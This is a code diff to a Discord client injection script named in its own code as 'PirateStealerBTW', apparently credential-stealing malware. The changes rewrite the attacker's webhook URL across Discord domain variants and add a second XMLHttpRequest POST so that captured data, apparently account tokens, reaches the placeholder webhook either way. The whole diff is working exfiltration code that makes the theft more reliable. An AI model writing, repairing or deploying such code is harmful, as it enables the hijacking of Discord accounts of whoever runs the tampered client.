@@ -17,7 +17,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
 
   var webhook = "%WEBHOOK_LINK%";
-  webhook = webhook.replace("discordapp", "discord")
+  webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
   function FirstTime(){
       
       if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
@@ -57,7 +57,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     const window = BrowserWindow.getAllWindows()[0];
 
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook}", true);
+    xhr.open("POST", "${webhook.replace("discord.", "discordapp.")}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
@@ -65,8 +65,16 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
     }));
 
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${webhook.replace("discordapp.", "discord.")}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, true).then((token => {
 
-  }
+    }));
+
+}
   
   
   function GetNitro(flags){
